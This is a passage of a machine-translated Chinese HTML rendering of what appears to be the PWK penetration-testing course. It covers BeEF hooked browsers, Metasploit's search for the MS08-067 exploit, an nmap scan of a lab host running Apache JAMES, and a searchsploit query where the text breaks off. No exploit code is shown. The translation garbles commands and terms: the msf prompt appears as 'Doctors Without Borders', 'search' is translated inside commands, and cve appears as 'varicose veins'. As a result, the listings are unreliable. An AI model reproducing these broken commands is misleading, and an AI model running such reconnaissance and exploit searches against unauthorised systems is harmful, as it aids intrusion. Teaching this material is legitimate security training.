<div style="position:absolute;top:8491;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="8"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 8 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:8524;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:9601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:9601;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:9601;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">449</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:9387;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 259：访问 BeEF 上的演示页面</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:9419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们的浏览器被钩住，它将出现在 BeEF 控制台的“Hooked Browsers”面板中</font></font></nobr></div>
<div style="position:absolute;top:9438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地主机 IP </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">单击我们的 IP（现在称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">僵尸</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）应该会向我们显示一个新的</font></font></nobr></div>
<div style="position:absolute;top:9457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含有关我们的受害者浏览器的详细信息的页面。</font><font style="vertical-align: inherit;">然后我们可以继续下的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡</font></font></nobr></div>
<div style="position:absolute;top:9477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以找到各种枚举脚本和漏洞利用： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:9679;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="9"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 9 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:9712;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:10789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:10789;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:10789;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">450</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10187;left:359"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 260：可用的 BeEF 漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:10218;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.2.4 Metasploit 框架</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:10252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">376</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个出色的框架，旨在协助开发和执行漏洞利用。</font></font></nobr></div>
<div style="position:absolute;top:10272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个框架默认在 Kali Linux 中可用，可以通过</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">msfconsole</font></font></b><font style="vertical-align: inherit;">启动</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:10292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo msfconsole -q</font></font></font></b></nobr></div>
<div style="position:absolute;top:10360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无国界医生 &gt; </font></font></nobr></div>
<div style="position:absolute;top:10380;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 417 - 启动 Metasploit 框架</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:10409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个框架的使用在一个不同的模块中有深入的介绍，所以我们将只关注列表</font></font></nobr></div>
<div style="position:absolute;top:10428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架内可用的漏洞利用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></nobr></div>
<div style="position:absolute;top:10461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了演示，请考虑搜索流行的 MS08_067 </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">377</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索 ms08_067</font></font></font></b></nobr></div>
<div style="position:absolute;top:10530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配模块</font></font></nobr></div>
<div style="position:absolute;top:10547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================</font></font></nobr></div>
<div style="position:absolute;top:10581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:10581;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">披露日期 说明</font></font></nobr></div>
<div style="position:absolute;top:10598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:10598;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------------- -----------</font></font></nobr></div>
<div style="position:absolute;top:10615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用/windows/smb/ms08_067_netapi 2008-10-28 MS08-067 Microsoft 服务器服务</font></font></nobr></div>
<div style="position:absolute;top:10632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e 相对路径堆栈损坏</font></font></nobr></div>
<div style="position:absolute;top:10651;left:287"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 418 - 在 Metasploit 中搜索 ms08_067 漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:10719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">376 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Rapid7，2019），https://www.metasploit.com</font></font></font></nobr></div>
<div style="position:absolute;top:10739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">377 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:10867;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="10"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 10 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:10900;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:11977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:11977;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:11977;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">451</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:10996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 的搜索命令包括许多关键字来帮助我们找到特定的漏洞。</font><font style="vertical-align: inherit;">至</font></font></nobr></div>
<div style="position:absolute;top:11015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出所有可用选项，</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-h</font></font></b><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:11050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索 -h</font></font></font></b></nobr></div>
<div style="position:absolute;top:11067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：搜索 [选项] &lt;关键字&gt;</font></font></nobr></div>
<div style="position:absolute;top:11101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:11118;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-H    </font></font></nobr></div>
<div style="position:absolute;top:11118;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示此帮助信息</font></font></nobr></div>
<div style="position:absolute;top:11135;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o &lt;文件&gt;    </font></font></nobr></div>
<div style="position:absolute;top:11135;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将输出发送到 csv 格式的文件</font></font></nobr></div>
<div style="position:absolute;top:11152;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-S &lt;string&gt; 行过滤器的搜索字符串</font></font></nobr></div>
<div style="position:absolute;top:11169;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u    </font></font></nobr></div>
<div style="position:absolute;top:11169;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果有一个结果，则使用模块</font></font></nobr></div>
<div style="position:absolute;top:11203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关键词：</font></font></nobr></div>
<div style="position:absolute;top:11220;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">又名    </font></font></nobr></div>
<div style="position:absolute;top:11220;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：具有匹配 AKA（也称为）名称的模块</font></font></nobr></div>
<div style="position:absolute;top:11237;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">author : 该作者编写的模块</font></font></nobr></div>
<div style="position:absolute;top:11254;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拱    </font></font></nobr></div>
<div style="position:absolute;top:11254;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：影响此架构的模块</font></font></nobr></div>
<div style="position:absolute;top:11271;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出价    </font></font></nobr></div>
<div style="position:absolute;top:11271;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：具有匹配 Bugtraq ID 的模块</font></font></nobr></div>
<div style="position:absolute;top:11287;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">静脉曲张    </font></font></nobr></div>
<div style="position:absolute;top:11287;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：具有匹配 CVE ID 的模块</font></font></nobr></div>
<div style="position:absolute;top:11304;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">教育局    </font></font></nobr></div>
<div style="position:absolute;top:11304;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 具有匹配 Exploit-DB ID 的模块</font></font></nobr></div>
<div style="position:absolute;top:11322;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">check : 支持“check”方法的模块</font></font></nobr></div>
<div style="position:absolute;top:11339;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日期    </font></font></nobr></div>
<div style="position:absolute;top:11339;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：具有匹配披露日期的模块</font></font></nobr></div>
<div style="position:absolute;top:11356;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">description : 具有匹配描述的模块</font></font></nobr></div>
<div style="position:absolute;top:11372;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">full_name ：具有匹配全名的模块</font></font></nobr></div>
<div style="position:absolute;top:11389;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mod_time ：具有匹配修改日期的模块</font></font></nobr></div>
<div style="position:absolute;top:11406;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:11406;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 具有匹配描述性名称的模块</font></font></nobr></div>
<div style="position:absolute;top:11423;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小路    </font></font></nobr></div>
<div style="position:absolute;top:11423;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 具有匹配路径的模块</font></font></nobr></div>
<div style="position:absolute;top:11440;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">platform : 影响这个平台的模块</font></font></nobr></div>
<div style="position:absolute;top:11457;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口    </font></font></nobr></div>
<div style="position:absolute;top:11457;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 具有匹配端口的模块</font></font></nobr></div>
<div style="position:absolute;top:11474;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">秩    </font></font></nobr></div>
<div style="position:absolute;top:11474;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：具有匹配等级的模块（可以是描述性的（例如：'good'）或数字</font></font></nobr></div>
<div style="position:absolute;top:11491;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考    </font></font></nobr></div>
<div style="position:absolute;top:11491;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 具有匹配引用的模块</font></font></nobr></div>
<div style="position:absolute;top:11508;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考：具有匹配参考的模块</font></font></nobr></div>
<div style="position:absolute;top:11525;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">target : 影响这个目标的模块</font></font></nobr></div>
<div style="position:absolute;top:11542;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型    </font></font></nobr></div>
<div style="position:absolute;top:11542;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：特定类型的模块（漏洞利用、有效载荷、辅助、编码器、eva</font></font></nobr></div>
<div style="position:absolute;top:11576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例子：</font></font></nobr></div>
<div style="position:absolute;top:11593;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索 cve:2009 类型：exploit</font></font></nobr></div>
<div style="position:absolute;top:11612;left:272"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 419 - 在 Metasploit 中显示可用的搜索选项</font></font></i></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:11646;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.3 放在一起</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:11688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">涵盖了所有资源后，让我们演示一下在真实场景中的样子。</font><font style="vertical-align: inherit;">我们是</font></font></nobr></div>
<div style="position:absolute;top:11707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将攻击我们的专用 Linux 客户端，该客户端托管一个易受公众攻击的应用程序</font></font></nobr></div>
<div style="position:absolute;top:11727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发。</font></font></nobr></div>
<div style="position:absolute;top:11759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们通过运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来确定机器有哪些服务来</font><font style="vertical-align: inherit;">开始我们的枚举过程</font></font></nobr></div>
<div style="position:absolute;top:11779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">暴露在网络中：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:11814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nmap 10.11.0.128 -p- -sV -vv --open --reason</font></font></font></b></nobr></div>
<div style="position:absolute;top:11831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:11848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描10.11.0.128【65535端口】</font></font></nobr></div>
<div style="position:absolute;top:11865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.0.128 上发现开放端口 3389/tcp</font></font></nobr></div>
<div style="position:absolute;top:11881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.0.128 上发现开放端口 110/tcp</font></font></nobr></div>
<div style="position:absolute;top:11898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.0.128 上发现开放端口 25/tcp</font></font></nobr></div>
<div style="position:absolute;top:11916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.0.128 上发现开放端口 22/tcp </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:12055;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="11"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 11 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:12088;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:13165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:13165;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:13165;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">452</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:12184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.0.128 上发现开放端口 119/tcp</font></font></nobr></div>
<div style="position:absolute;top:12200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.0.128 上发现开放端口 4555/tcp</font></font></nobr></div>
<div style="position:absolute;top:12217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14:23 完成 SYN Stealth Scan，耗时 49.03 秒（总共 65535 个端口）</font></font></nobr></div>
<div style="position:absolute;top:12234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 14:23 启动服务扫描</font></font></nobr></div>
<div style="position:absolute;top:12252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.0.128 上扫描 6 个服务</font></font></nobr></div>
<div style="position:absolute;top:12268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 14:23 完成服务扫描，11.47 秒过去（1 台主机上的 6 个服务）</font></font></nobr></div>
<div style="position:absolute;top:12285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NSE：脚本扫描 10.11.0.128。</font></font></nobr></div>
<div style="position:absolute;top:12302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:12319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.128 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:12336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动，收到 arp 响应（0.15 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:12353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-04-13 14:22:57 EEST 扫描61s</font></font></nobr></div>
<div style="position:absolute;top:12370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：65304 个封闭端口，225 个过滤端口</font></font></nobr></div>
<div style="position:absolute;top:12387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原因：65304 次重置和 225 次无响应</font></font></nobr></div>
<div style="position:absolute;top:12404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 --defeat-rst-ratelimit，一些关闭的端口可能被报告为已过滤</font></font></nobr></div>
<div style="position:absolute;top:12421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务原因    </font></font></nobr></div>
<div style="position:absolute;top:12421;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本</font></font></nobr></div>
<div style="position:absolute;top:12438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22/tcp 打开 ssh    </font></font></nobr></div>
<div style="position:absolute;top:12438;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u3（协议 2</font></font></nobr></div>
<div style="position:absolute;top:12455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25/tcp 打开 smtp    </font></font></nobr></div>
<div style="position:absolute;top:12455;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同步确认 ttl 64 詹姆斯 smtpd 2.3.2</font></font></nobr></div>
<div style="position:absolute;top:12472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">110/tcp 打开pop3    </font></font></nobr></div>
<div style="position:absolute;top:12472;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同步确认 ttl 64 詹姆斯 pop3d 2.3.2</font></font></nobr></div>
<div style="position:absolute;top:12489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">119/tcp 打开 ntp    </font></font></nobr></div>
<div style="position:absolute;top:12489;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">syn-ack ttl 64 JAMES nntpd（发布正常）</font></font></nobr></div>
<div style="position:absolute;top:12506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3389/tcp 打开 ms-wbt-server 同步确认 ttl 64 xrdp</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:12523;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4555/tcp 打开 james-admin syn-ack ttl 64 JAMES 远程管理 2.3.2</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:12540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:93:2E:E7 (VMware)</font></font></nobr></div>
<div style="position:absolute;top:12557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务信息： 主机：debian；</font><font style="vertical-align: inherit;">操作系统：Linux；</font><font style="vertical-align: inherit;">CPE: cpe:/o:linux:linux_kernel</font></font></nobr></div>
<div style="position:absolute;top:12591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从以下位置读取数据文件：/usr/bin/../share/nmap</font></font></nobr></div>
<div style="position:absolute;top:12608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：在 61.11 秒内扫描了 1 个 IP 地址（1 个主机启动）</font></font></nobr></div>
<div style="position:absolute;top:12625;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送的原始数据包：76606 (3.371MB) | </font><font style="vertical-align: inherit;">Rcvd：71970 (2.879MB)</font></font></nobr></div>
<div style="position:absolute;top:12644;left:201"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 420 - 使用 nmap 枚举专用 Linux 客户端上公开的服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:12673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据我们的扫描输出，系统似乎正在 TCP 端口上运行 SSH 服务器</font></font></nobr></div>
<div style="position:absolute;top:12693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22、TCP 端口 3389 上的 XRDP，以及标记为“JAMES”的各种服务。</font><font style="vertical-align: inherit;">使用 Google 获取更多信息</font></font></nobr></div>
<div style="position:absolute;top:12712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于 JAMES 服务是什么的信息使我们相信我们的目标正在运行 Apache</font></font></nobr></div>
<div style="position:absolute;top:12732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">詹姆士。</font></font></nobr></div>
<div style="position:absolute;top:12764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了找到任何可用的漏洞，我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:12799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit james</font></font></font></b></nobr></div>
<div style="position:absolute;top:12816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------------------- ----------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:12833;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用标题    </font></font></nobr></div>
